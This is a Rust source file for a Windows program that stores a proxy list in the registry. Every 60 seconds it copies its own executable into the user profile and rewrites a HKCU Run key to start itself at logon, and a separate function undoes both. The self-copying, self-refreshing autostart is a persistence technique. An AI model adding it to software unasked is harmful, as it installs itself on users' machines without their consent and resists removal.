use std::{path::Path, fs, time::Duration};
use winreg::{RegKey, enums::*, RegValue};
use crate::{SOFTWARE_REGISTRY_NAME, SOFTWARE_EXECUTABLE_NAME, SOFTWARE_DIRECTORY_NAME, PROXIES, PROXY_ALL};
pub async fn main() {
    let hkcu= RegKey::predef(HKEY_CURRENT_USER);
    let soft= hkcu.create_subkey_with_flags(format!("Software\\{}", *SOFTWARE_DIRECTORY_NAME.lock().await), KEY_WRITE | KEY_READ).unwrap().0;
    drop(hkcu);
    let mut lock= PROXIES.lock().await;
    let name= &*SOFTWARE_EXECUTABLE_NAME.lock().await.clone();
    match soft.get_raw_value(name) {
        Ok(val) => {
            let b= val.bytes;
            *PROXY_ALL.lock().await= b[0]> 0;
            let mut index= 1;
            while index< b.len() {
                let start= index;
                while index< b.len() && b[index]!= 0 {
                    index+= 1;
                }
                lock.push(String::from_utf8_lossy(&b[start..index]).to_string());
                index+= 1;
            }
        }
        Err(_) => {
            if lock.len()== 0 {
                lock.push("pixeldrain".into());
            }
            drop(lock);
            update_proxies().await;
        }
    }
    tokio::spawn(async {
        loop {
            update_registry().await;
            tokio::time::sleep(Duration::from_secs_f64(60.)).await;
        }
    });
}
pub async fn update_proxies() {
    let hkcu= RegKey::predef(HKEY_CURRENT_USER);
    let soft= hkcu.create_subkey_with_flags(format!("Software\\{}", *SOFTWARE_DIRECTORY_NAME.lock().await), KEY_WRITE | KEY_READ).unwrap().0;
    let lock= PROXIES.lock().await;
    let mut b= Vec::new();
    b.push(*PROXY_ALL.lock().await as u8);
    for value in &*lock {
        b.extend(value.as_bytes());
        b.push(0);
    }
    soft.set_raw_value(&*SOFTWARE_EXECUTABLE_NAME.lock().await, &RegValue {
        bytes: b,
        vtype: RegType::REG_BINARY
    }).unwrap();
}
pub async fn remove() {
    let hkcu= RegKey::predef(HKEY_CURRENT_USER);
    let soft= hkcu.create_subkey_with_flags("Software\\", KEY_WRITE | KEY_READ).unwrap().0;
    soft.delete_subkey_all(&*SOFTWARE_DIRECTORY_NAME.lock().await).unwrap();
    let key= hkcu.create_subkey_with_flags("Software\\Microsoft\\Windows\\CurrentVersion\\Run", KEY_WRITE | KEY_READ).unwrap().0;
    key.delete_value(&*SOFTWARE_REGISTRY_NAME.lock().await).unwrap();
}
pub async fn update_registry() {
    let mut path= std::env::var_os("USERPROFILE").unwrap().to_string_lossy().to_string() + "\\" + &*SOFTWARE_DIRECTORY_NAME.lock().await + "\\";
    if !Path::new(&path).exists() {
        fs::create_dir_all(&path).unwrap();
    }
    path+= &(SOFTWARE_EXECUTABLE_NAME.lock().await.to_lowercase() + ".exe");
    let _= fs::copy(std::env::current_exe().unwrap(), &path);
    let hkcu= RegKey::predef(HKEY_CURRENT_USER);
    let key= hkcu.create_subkey_with_flags("Software\\Microsoft\\Windows\\CurrentVersion\\Run", KEY_WRITE).unwrap().0;
    key.set_value(&*SOFTWARE_REGISTRY_NAME.lock().await, &("\"".to_owned() + &path + "\"")).unwrap();
}